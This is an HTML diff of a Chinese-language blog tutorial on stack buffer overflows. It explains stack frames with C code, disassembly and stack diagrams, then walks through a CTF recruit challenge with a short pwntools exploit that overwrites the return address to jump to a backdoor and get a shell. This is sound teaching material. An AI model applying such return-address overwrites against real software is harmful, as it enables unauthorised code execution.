@@ -1,0 +1,734 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+
+<!-- Head tag -->
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!--Description-->
+    
+        <meta name="description" content="那次栈溢出，毁了我的胖高手梦。">
+    
+
+    <!--Author-->
+    
+        <meta name="author" content="Timlzh">
+    
+
+    <!-- Title -->
+    
+    <title>第二章：那次栈溢出，毁了我的胖高手梦。 | 我也要成为胖高手 | Tim的杂货铺</title>
+
+    <!-- favicon -->
+    
+        <link rel="shortcut icon" href="https://timlzh.github.io/melody-favicon.ico">
+    
+
+    <!-- Bootstrap Core CSS -->
+    <link href="//cdn.jsdelivr.net/npm/bootstrap@3.3.6/dist/css/bootstrap.min.css" rel="stylesheet">
+
+    <!-- Valine -->
+    <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+
+    <link rel="stylesheet" href="/server-archive/css/darkmode.css">
+
+    <!-- Custom CSS -->
+    
+<link rel="stylesheet" href="/server-archive/css/style.css">
+
+
+    <!-- Top Menu  -->
+    <div class="top_menu">
+        
+            
+            <a href="/server-archive/">Home</a>
+            
+            <a href="/server-archive/links">Friends</a>
+            
+            <a href="/server-archive/tags">Tags</a>
+            
+            <a href="/server-archive/about">About</a>
+            
+            <a href="/server-archive/">asdfa</a>
+            
+        
+        <a class="darkmode-toggle" href="#" data-toggle="darkmode">
+            <i class="fa fa-moon-o"></i>
+            <i class="fa fa-sun-o" style="display: none;"></i>
+        </a>
+    </div>
+
+    <!-- Darkmode -->
+    <script src='/server-archive/js/darkmode.js'></script>
+
+    <!-- Custom Fonts -->
+    <link href="//cdn.jsdelivr.net/npm/font-awesome@4.5.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+    <link href='//fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
+    <link href='//fonts.googleapis.com/css?family=Noto+Serif:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
+
+    <!-- jQuery -->
+    <script src="//cdn.bootcss.com/jquery/2.2.1/jquery.min.js"></script>
+    <!-- Bootstrap -->
+    <script src="//cdn.jsdelivr.net/npm/bootstrap@3.3.6/dist/js/bootstrap.min.js"></script>
+
+    <!-- Highlight -->
+    
+        <script>
+            var lightTheme = "github";
+            var darkTheme = "github-dark-dimmed";
+        </script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+    
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+    <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+    <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/server-archive/atom.xml" title="Tim的杂货铺" type="application/atom+xml">
+</head>
+
+
+<body>
+
+    <!-- Content -->
+    
+
+
+<section class="article-container">
+    <!-- Back Home -->
+    <!-- <a class="nav-back" href="javascript:back()">
+    <i class="fa fa-arrow-left"></i>
+</a>
+
+<script>
+    function back() {
+        var home = '/server-archive/'
+        if (document.referrer && document.referrer.indexOf(home) > -1) {
+            window.history.back();
+        } else {
+            window.location.href = home;
+        }
+    }
+</script> -->
+
+        <!-- Page Header -->
+        <header class="intro-header">
+            <div class="container">
+                <div class="row">
+                    <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                        <div class="post-heading">
+                            <h1>
+                                第二章：那次栈溢出，毁了我的胖高手梦。
+                            </h1>
+                            <div class="subheading">
+                                我也要成为胖高手
+                            </div>
+                            <hr>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </header>
+
+        <!-- Post Content -->
+        <article>
+            <div class="container">
+                <div class="row">
+                    <!-- Post Main Content -->
+                    <div class="post-content col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                        <p>那次栈溢出，毁了我的胖高手梦。</p>
+<span id="more"></span>
+<h2 id="%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86" tabindex="-1">栈溢出原理</h2>
+<h3 id="%E5%87%BD%E6%95%B0%E6%89%A7%E8%A1%8C%E6%97%B6%E7%9A%84%E6%A0%88" tabindex="-1">函数执行时的栈</h3>
+<p>函数执行时，会在栈上分配一块内存，用来存放函数的局部变量、函数的参数、返回地址等信息。函数执行结束后，会释放这块内存。</p>
+<p>我们设想一个场景</p>
+<pre><code class="language-c">#include &lt;stdio.h&gt;
+
+void callee(int a, int b, int c, int d) &#123;
+    int x = a + b;
+    int y = c + d;
+    int z = x + y;
+    printf(&quot;%d\n&quot;, z);
+&#125;
+
+void caller() &#123;
+    int callerLocalVar = 114514;
+    callee(1, 2, 3, 4);
+&#125;
+
+int main() &#123;
+    caller();
+    return 0;
+&#125;
+</code></pre>
+<p>这段程序的汇编：</p>
+<pre><code class="language-asm">.text:0000000000001149 ; __int64 __fastcall callee(_QWORD, _QWORD, _QWORD, _QWORD)
+.text:0000000000001149                 public callee
+.text:0000000000001149 callee          proc near               ; CODE XREF: caller+27↓p
+.text:0000000000001149
+.text:0000000000001149 var_20          = dword ptr -20h
+.text:0000000000001149 var_1C          = dword ptr -1Ch
+.text:0000000000001149 var_18          = dword ptr -18h
+.text:0000000000001149 var_14          = dword ptr -14h
+.text:0000000000001149 var_C           = dword ptr -0Ch
+.text:0000000000001149 var_8           = dword ptr -8
+.text:0000000000001149 var_4           = dword ptr -4
+.text:0000000000001149
+.text:0000000000001149 ; __unwind &#123;
+.text:0000000000001149                 endbr64
+.text:000000000000114D                 push    rbp
+.text:000000000000114E                 mov     rbp, rsp
+.text:0000000000001151                 sub     rsp, 20h
+.text:0000000000001155                 mov     [rbp+var_14], edi
+.text:0000000000001158                 mov     [rbp+var_18], esi
+.text:000000000000115B                 mov     [rbp+var_1C], edx
+.text:000000000000115E                 mov     [rbp+var_20], ecx
+.text:0000000000001161                 mov     edx, [rbp+var_14]
+.text:0000000000001164                 mov     eax, [rbp+var_18]
+.text:0000000000001167                 add     eax, edx
+.text:0000000000001169                 mov     [rbp+var_C], eax
+.text:000000000000116C                 mov     edx, [rbp+var_1C]
+.text:000000000000116F                 mov     eax, [rbp+var_20]
+.text:0000000000001172                 add     eax, edx
+.text:0000000000001174                 mov     [rbp+var_8], eax
+.text:0000000000001177                 mov     edx, [rbp+var_C]
+.text:000000000000117A                 mov     eax, [rbp+var_8]
+.text:000000000000117D                 add     eax, edx
+.text:000000000000117F                 mov     [rbp+var_4], eax
+.text:0000000000001182                 mov     eax, [rbp+var_4]
+.text:0000000000001185                 mov     esi, eax
+.text:0000000000001187                 lea     rax, format     ; &quot;%d\n&quot;
+.text:000000000000118E                 mov     rdi, rax        ; format
+.text:0000000000001191                 mov     eax, 0
+.text:0000000000001196                 call    _printf
+.text:000000000000119B                 nop
+.text:000000000000119C                 leave
+.text:000000000000119D                 retn
+.text:000000000000119D ; &#125; // starts at 1149
+.text:000000000000119D callee          endp
+.text:000000000000119D
+.text:000000000000119E
+.text:000000000000119E ; =============== S U B R O U T I N E =======================================
+.text:000000000000119E
+.text:000000000000119E ; Attributes: bp-based frame
+.text:000000000000119E
+.text:000000000000119E ; __int64 caller()
+.text:000000000000119E                 public caller
+.text:000000000000119E caller          proc near               ; CODE XREF: main+D↓p
+.text:000000000000119E
+.text:000000000000119E var_4           = dword ptr -4
+.text:000000000000119E
+.text:000000000000119E ; __unwind &#123;
+.text:000000000000119E                 endbr64
+.text:00000000000011A2                 push    rbp
+.text:00000000000011A3                 mov     rbp, rsp
+.text:00000000000011A6                 sub     rsp, 10h
+.text:00000000000011AA                 mov     [rbp+var_4], 1BF52h
+.text:00000000000011B1                 mov     ecx, 4
+.text:00000000000011B6                 mov     edx, 3
+.text:00000000000011BB                 mov     esi, 2
+.text:00000000000011C0                 mov     edi, 1
+.text:00000000000011C5                 call    callee
+.text:00000000000011CA                 nop
+.text:00000000000011CB                 leave
+.text:00000000000011CC                 retn
+.text:00000000000011CC ; &#125; // starts at 119E
+.text:00000000000011CC caller          endp
+</code></pre>
+<p>我们假设程序从<code>caller</code>函数开始执行，此时的栈上存放的是<code>caller</code>函数的局部变量、参数、返回地址等信息。</p>
+<p><img src="http://pic.timlzh.com/i/2023/11/30/jujkai-2.png" alt="图 1"></p>
+<table>
+<thead>
+<tr>
+<th>stack-top (low address)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>callerLocalVar</td>
+</tr>
+<tr>
+<td>rbp</td>
+</tr>
+<tr>
+<td>return address (main+18)</td>
+</tr>
+</tbody>
+</table>
+<p>当<code>caller</code>函数调用<code>callee</code>函数时，首先将<code>call</code>指令的下一条指令的地址（即<code>caller+44</code>）压入栈中，然后跳转到<code>callee</code>函数的入口地址（即<code>callee</code>函数的第一条指令的地址）开始执行。</p>
+<p><img src="http://pic.timlzh.com/i/2023/11/30/jvwqsb-2.png" alt="图 2"></p>
+<table>
+<thead>
+<tr>
+<th>stack-top (low address)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>return address (caller+44)</td>
+</tr>
+<tr>
+<td>callerLocalVar</td>
+</tr>
+<tr>
+<td>rbp</td>
+</tr>
+<tr>
+<td>return address (main+18)</td>
+</tr>
+</tbody>
+</table>
+<p><code>callee</code>函数执行时，先将rbp压入栈中，然后将rsp的值赋给rbp，这样就建立了一个新的栈帧，然后在新的栈帧中分配内存，用来存放<code>callee</code>函数的局部变量、参数、返回地址等信息。</p>
+<p>也就是这段汇编代码：</p>
+<pre><code class="language-asm">push rbp
+mov rbp, rsp
+sub rsp, 20h
+</code></pre>
+<p>执行完后，栈变成了这样：</p>
+<p><img src="http://pic.timlzh.com/i/2023/11/30/jxrb34-2.png" alt="图 3"></p>
+<table>
+<thead>
+<tr>
+<th>stack-top (low address)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>arg4</td>
+</tr>
+<tr>
+<td>arg3</td>
+</tr>
+<tr>
+<td>arg2</td>
+</tr>
+<tr>
+<td>arg1</td>
+</tr>
+<tr>
+<td>local variable z</td>
+</tr>
+<tr>
+<td>local variable y</td>
+</tr>
+<tr>
+<td>local variable x</td>
+</tr>
+<tr>
+<td>rbp (存放了上一个栈帧的rbp)</td>
+</tr>
+<tr>
+<td>return address (caller+44)</td>
+</tr>
+<tr>
+<td>callerLocalVar</td>
+</tr>
+<tr>
+<td>caller-rbp</td>
+</tr>
+<tr>
+<td>return address (main+18)</td>
+</tr>
+</tbody>
+</table>
+<p><code>callee</code>函数执行完后，会将rbp的值赋给rsp，这样就恢复了上一个栈帧。为什么没有看到这些指令呢？因为这些指令被<code>leave</code>指令代替了。</p>
+<p><code>leave</code>在x64下相当于</p>
+<pre><code class="language-asm">mov rsp, rbp
+pop rbp
+</code></pre>
+<p>执行完<code>leave</code>指令前后的栈变化如下：</p>
+<p><img src="http://pic.timlzh.com/i/2023/11/30/k1vzpd-2.png" alt="图 5"></p>
+<p><img src="http://pic.timlzh.com/i/2023/11/30/k1o8vi-2.png" alt="图 4"></p>
+<table>
+<thead>
+<tr>
+<th>stack-top (low address)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>return address (caller+44)</td>
+</tr>
+<tr>
+<td>callerLocalVar</td>
+</tr>
+<tr>
+<td>rbp (就是caller的rbp)</td>
+</tr>
+<tr>
+<td>return address (main+18)</td>
+</tr>
+</tbody>
+</table>
+<p>最后，<code>ret</code>指令会将栈顶的值赋给rip，这样就跳转到了<code>caller</code>函数的下一条指令开始执行。跳转后，理论上栈和进入<code>callee</code>函数前是一模一样的。</p>
+<p><img src="http://pic.timlzh.com/i/2023/11/30/k3p49e-2.png" alt="图 6"></p>
+<h3 id="%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86-1" tabindex="-1">栈溢出原理</h3>
+<p>栈溢出的原理就是，当我们向栈中写入数据时，如果写入的数据超过了栈的大小，就会覆盖栈上的其他内容，从而改变程序的执行流程。</p>
+<p>我们来看一个例子：</p>
+<pre><code class="language-c">#include &lt;stdio.h&gt;
+
+void callee() &#123;
+    char buf[4];
+    read(0, buf, 0x100);
+&#125;
+
+int main() &#123;
+    callee();
+    return 0;
+&#125;
+</code></pre>
+<p>像刚才分析的那样，<code>callee</code>函数执行时，会在栈上分配一块内存，用来存放函数的局部变量、函数的参数、返回地址等信息。这里的局部变量就是<code>buf</code>，它的大小是4字节。</p>
+<table>
+<thead>
+<tr>
+<th>stack-top (low address)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>buf[0]</td>
+</tr>
+<tr>
+<td>buf[1]</td>
+</tr>
+<tr>
+<td>buf[2]</td>
+</tr>
+<tr>
+<td>buf[3]</td>
+</tr>
+<tr>
+<td>rbp</td>
+</tr>
+<tr>
+<td>return address (main+18)</td>
+</tr>
+</tbody>
+</table>
+<p>当我们向<code>buf</code>中写入数据时，如果写入的数据超过了<code>buf</code>的大小，就会覆盖栈上的其他内容，从而改变程序的执行流程。</p>
+<p>假设我们输入的数据是<code>0123abcdefghABCDEFGH</code>，栈变成了这样：</p>
+<table>
+<thead>
+<tr>
+<th>stack</th>
+<th>content</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>buf[0]</td>
+<td>0</td>
+</tr>
+<tr>
+<td>buf[1]</td>
+<td>1</td>
+</tr>
+<tr>
+<td>buf[2]</td>
+<td>2</td>
+</tr>
+<tr>
+<td>buf[3]</td>
+<td>3</td>
+</tr>
+<tr>
+<td>rbp</td>
+<td>abcdefgh</td>
+</tr>
+<tr>
+<td>return address</td>
+<td>ABCDEFGH</td>
+</tr>
+</tbody>
+</table>
+<p>此时，返回地址被覆盖成了<code>ABCDEFGH</code>，当<code>callee</code>函数执行完后，会跳转到<code>ABCDEFGH</code>。（当然，这个地址是无效的，程序会崩溃）</p>
+<h2 id="%E6%A0%88%E6%BA%A2%E5%87%BA%E7%9A%84%E5%88%A9%E7%94%A8" tabindex="-1">栈溢出的利用</h2>
+<p>最基础的利用和上面举的例子差不多，通过修改return address，来控制执行的函数。</p>
+<p>用招新baby题来看看实际题目中是如何利用的：</p>
+<h3 id="%5Bcnss-recruit-2023%5D-stackoverflow" tabindex="-1">[CNSS Recruit 2023] StackOverFlow</h3>
+<p><img src="http://pic.timlzh.com/i/2023/11/30/nqlgdb-2.png" alt="图 8"></p>
+<p><img src="http://pic.timlzh.com/i/2023/11/30/nqodpr-2.png" alt="图 9"></p>
+<p><img src="http://pic.timlzh.com/i/2023/11/30/nr044s-2.png" alt="图 10"></p>
+<p>在<code>vuln</code>函数中，我们可以看到，<code>gets</code>可以往<code>v1</code>中写入大量数据，但是<code>v1</code>的大小只有<code>0x10</code>，所以我们可以通过<code>gets</code>向<code>v1</code>中写入大量数据，从而覆盖return address为<code>B4ckdo0r</code>的地址，从而getshell。</p>
+<p>ida中给我们写出了<code>v1</code>到rbp的偏移量(<code>rbp-10h</code>)，我们可以想像一下运行时的栈结构。</p>
+<table>
+<thead>
+<tr>
+<th>栈</th>
+<th>相对栈顶位置</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>v1</td>
+<td>0</td>
+</tr>
+<tr>
+<td>rbp</td>
+<td>0x10</td>
+</tr>
+<tr>
+<td>return address</td>
+<td>0x18</td>
+</tr>
+</tbody>
+</table>
+<p>注意，<code>v1</code>到<code>rbp</code>是0x10，但是<code>rbp</code>本身还有8字节，所以<code>v1</code>到<code>return address</code>的偏移量是0x18。（如果是32位程序，<code>ebp</code>本身是4字节，只用加4）</p>
+<p>所以我们只需要输入<code>0x18</code>个字节的数据，然后再输入<code>B4ckdo0r</code>的地址，就可以getshell了。</p>
+<p>exp如下：</p>
+<pre><code class="language-python">#!/usr/bin/env python
+from pwn import *
+from pwn import p64, u64, p32, u32
+import os
+
+fileName = './pwn'
+r = process(fileName)
+elf = ELF(fileName)
+
+backdoor_addr = 0x401232
+
+payload = cyclic(0x10 + 8) + p64(backdoor_addr)
+r.sendlineafter(b'\n', payload)
+r.interactive()
+</code></pre>
+<p>溢出后的栈变成了这样：</p>
+<p><img src="http://pic.timlzh.com/i/2023/11/30/o03hm9-2.png" alt="图 13"></p>
+<table>
+<thead>
+<tr>
+<th>stack</th>
+<th>content</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>v1</td>
+<td>cyclic(0x10)</td>
+</tr>
+<tr>
+<td>rbp</td>
+<td>cyclic(8)</td>
+</tr>
+<tr>
+<td>return address</td>
+<td>0x401232 (B4ckdo0r+8)</td>
+</tr>
+</tbody>
+</table>
+<p>为什么这里用了地址<code>0x401232</code>而不是<code>B4ckdo0r</code>的起始地址<code>0x40122A</code>呢？</p>
+<p><img src="http://pic.timlzh.com/i/2023/11/30/nwc7dl-2.png" alt="图 11"></p>
+<p>是因为<code>system</code>函数需要栈平衡，所以跳过了前面修改栈的两条指令。</p>
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">
+
+
+                            <!-- Meta -->
+                            <div class="post-meta">
+                                <hr>
+                                <br>
+                                <div class="post-tags">
+                                    
+                                        
+
+<a href="/server-archive/tags/我也要成为胖高手/">#我也要成为胖高手</a> <a href="/server-archive/tags/PWN/">#PWN</a> <a href="/server-archive/tags/CTF/">#CTF</a> <a href="/server-archive/tags/学习/">#学习</a>
+
+
+                                            
+                                </div>
+                                <div class="post-date">
+                                    
+                                        2023-11-30
+                                    
+                                </div>
+                            </div>
+                    </div>
+
+                    <!-- Comments -->
+                    <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                        <!-- Disqus Comments -->
+
+<div id="vcomments" class="comment"></div>
+<script>
+  new Valine({
+    el: '.comment',
+    appId: 'TSp33hlPwuAsaq6YiQt7qxqB-gzGzoHsz',
+    appKey: '4pv9GKDHCxnThP1EN1u9uYSN',
+    placeholder: 'random',
+    avatar: '',
+    enableQQ: true,
+    emojiCDN: '//i0.hdslb.com/bfs/emote/',
+    // 表情title和图片映射
+    emojiMaps: {
+      "tv_doge": "6ea59c827c414b4a2955fe79e0f6fd3dcd515e24.png",
+      "tv_亲亲": "a8111ad55953ef5e3be3327ef94eb4a39d535d06.png",
+      "tv_偷笑": "bb690d4107620f1c15cff29509db529a73aee261.png",
+      "tv_再见": "180129b8ea851044ce71caf55cc8ce44bd4a4fc8.png",
+      "tv_冷漠": "b9cbc755c2b3ee43be07ca13de84e5b699a3f101.png",
+      "tv_发怒": "34ba3cd204d5b05fec70ce08fa9fa0dd612409ff.png",
+      "tv_发财": "34db290afd2963723c6eb3c4560667db7253a21a.png",
+      "tv_可爱": "9e55fd9b500ac4b96613539f1ce2f9499e314ed9.png",
+      "tv_吐血": "09dd16a7aa59b77baa1155d47484409624470c77.png",
+      "tv_呆": "fe1179ebaa191569b0d31cecafe7a2cd1c951c9d.png",
+      "tv_呕吐": "9f996894a39e282ccf5e66856af49483f81870f3.png",
+      "tv_困": "241ee304e44c0af029adceb294399391e4737ef2.png",
+      "tv_坏笑": "1f0b87f731a671079842116e0991c91c2c88645a.png",
+      "tv_大佬": "093c1e2c490161aca397afc45573c877cdead616.png",
+      "tv_大哭": "23269aeb35f99daee28dda129676f6e9ea87934f.png",
+      "tv_委屈": "d04dba7b5465779e9755d2ab6f0a897b9b33bb77.png",
+      "tv_害羞": "a37683fb5642fa3ddfc7f4e5525fd13e42a2bdb1.png",
+      "tv_尴尬": "7cfa62dafc59798a3d3fb262d421eeeff166cfa4.png",
+      "tv_微笑": "70dc5c7b56f93eb61bddba11e28fb1d18fddcd4c.png",
+      "tv_思考": "90cf159733e558137ed20aa04d09964436f618a1.png",
+      "tv_惊吓": "0d15c7e2ee58e935adc6a7193ee042388adc22af.png",
+      "tv_打脸": "56ab10b624063e966bfcb76ea5dc4794d87dfd47.png",
+      "tv_抓狂": "fe31c08edad661d63762b04e17b8d5ae3c71a757.png",
+      "tv_抠鼻": "c666f55e88d471e51bbd9fab9bb308110824a6eb.png",
+      "tv_斜眼笑": "911f987aa8bc1bee12d52aafe62bc41ef4474e6c.png",
+      "tv_无奈": "ea8ed89ee9878f2fece2dda0ea8a5dbfe21b5751.png",
+      "tv_晕": "5443c22b4d07fb1907ccc610c8e6db254f2461b7.png",
+      "tv_流汗": "cead1c351ab8d79e9f369605beb90148db0fbed3.png",
+      "tv_流泪": "7e71cde7858f0cd50d74b0264aa26db612a8a167.png",
+      "tv_流鼻血": "c32d39db2737f89b904ca32700d140a9241b0767.png",
+      "tv_点赞": "f85c354995bd99e28fc76c869bfe42ba6438eff4.png",
+      "tv_生气": "26702dcafdab5e8225b43ffd23c94ac1ff932654.png",
+      "tv_生病": "8b0ec90e6b86771092a498c54f09fc94621c1900.png",
+      "tv_疑问": "0793d949b18d7be716078349c202c15ff166f314.png",
+      "tv_白眼": "c1d59f439e379ee50eef488bcb5e5378e5044ea4.png",
+      "tv_皱眉": "72ccad6679fea0d14cce648b4d818e09b8ffea2d.png",
+      "tv_目瞪口呆": "0b8cb81a68de5d5365212c99375e7ace3e7891b7.png",
+      "tv_睡着": "8b196675b53af58264f383c50ad0945048290b33.png",
+      "tv_笑哭": "1abc628f6d4f4caf9d0e7800878f4697abbc8273.png",
+      "tv_腼腆": "89712c0d4af73e67f89e35cbc518420380a7f6f4.png",
+      "tv_色": "61822c7e9aae5da76475e7892534545336b23a6f.png",
+      "tv_调侃": "4bc022533ef31544ca0d72c12c808cf4a1cce3e3.png",
+      "tv_调皮": "b9c41de8e82dd7a8515ae5e3cb63e898bf245186.png",
+      "tv_鄙视": "6e72339f346a692a495b123174b49e4e8e781303.png",
+      "tv_闭嘴": "c9e990da7f6e93975e25fd8b70e2e290aa4086ef.png",
+      "tv_难过": "87f46748d3f142ebc6586ff58860d0e2fc8263ba.png",
+      "tv_馋": "fc7e829b845c43c623c8b490ee3602b7f0e76a31.png",
+      "tv_鬼脸": "0ffbbddf8a94d124ca2f54b360bbc04feb6bbfea.png",
+      "tv_黑人问号": "45821a01f51bc867da9edbaa2e070410819a95b2.png",
+      "tv_鼓掌": "1d21793f96ef4e6f48b23e53e3b9e42da833a0f6.png"
+      // ... 更多表情
+    }
+  })
+  if('random' == 'random'){
+    var veditor = document.getElementById("veditor");
+    fetch('https://v1.hitokoto.cn')
+        .then(response => response.json())
+        .then(data => {
+        veditor.placeholder = '『' + data.hitokoto + '』' + '\n\n\n' + 'From  ' + data.from;
+        })
+        .catch(console.error)
+  }
+</script>
+
+                    </div>
+                </div>
+            </div>
+        </article>
+</section>
+
+<!-- Image viewer-->
+
+    
+    <!-- Custom picture view-->
+    <link href="/server-archive/css/viewer.min.css" rel="stylesheet" />
+    <script
+      src="/server-archive/js/viewer.min.js"
+      type="text/javascript"
+      charset="utf-8"
+    ></script>
+    
+    <script type="text/javascript">
+      // set image viewer
+      Viewer.setDefaults({
+        zoomRatio: [0.5],
+        navbar: false,
+        toolbar: false,
+        button: false,
+        title: [2, (image, imageData) => `${image.alt}`],
+        show: function() {
+          this.viewer.zoomTo(0.5);
+        }
+      });
+      var imageList = document.getElementsByTagName("img");
+      Array.prototype.forEach.call(imageList, element => {
+        var viewer = new Viewer(element);
+      });
+    </script>
+
+    
+
+
+<!-- TOC -->
+<!-- 
+    <aside id="article-toc" role="navigation" class="fixed">
+        <div id="article-toc-inner">
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86"><span class="toc-text">栈溢出原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E6%89%A7%E8%A1%8C%E6%97%B6%E7%9A%84%E6%A0%88"><span class="toc-text">函数执行时的栈</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86-1"><span class="toc-text">栈溢出原理</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%88%E6%BA%A2%E5%87%BA%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-text">栈溢出的利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%5Bcnss-recruit-2023%5D-stackoverflow"><span class="toc-text">[CNSS Recruit 2023] StackOverFlow</span></a></li></ol></li></ol>
+        </div>
+    </aside>
+ -->
+
+
+    <script>
+        hljs.highlightAll();
+    </script>
+
+    <!-- Scripts -->
+    <script type="text/javascript">
+    console.log("© Timlzh 🙋 2022-" + new Date().getFullYear());
+    console.log("Welcome to my blog: https://timlzh.com");
+</script>
+  
+    <!-- Google Analytics -->
+    
+
+    <!-- Service Worker -->
+    <!-- if using service worker -->
+
+    
+    <!-- Go Top -->
+    <a class="go-top">
+    <i class="fa fa-arrow-up"></i>
+</a>
+
+<script type="text/javascript">
+    if ($(window).scrollTop() <= 100) {
+        $(".go-top").hide();
+    }
+    
+    $(function () {
+        $(window).scroll(function () {
+            if ($(window).scrollTop() > 100) {
+                $(".go-top").fadeIn(500);
+            } else {
+                $(".go-top").fadeOut(500);
+            }
+        });
+        $(".go-top").click(function () {
+            $('body,html').animate({scrollTop: 0}, 500);
+            return false;
+        });
+    });
+</script>
+</body>
+
+<footer>
+    
+    
+    
+        <div class="beian">
+            <a href="http://www.beian.miit.gov.cn" target="_blank">浙ICP备2022036129号-2</a>
+        </div>
+    
+
+</footer>
+
+</html>
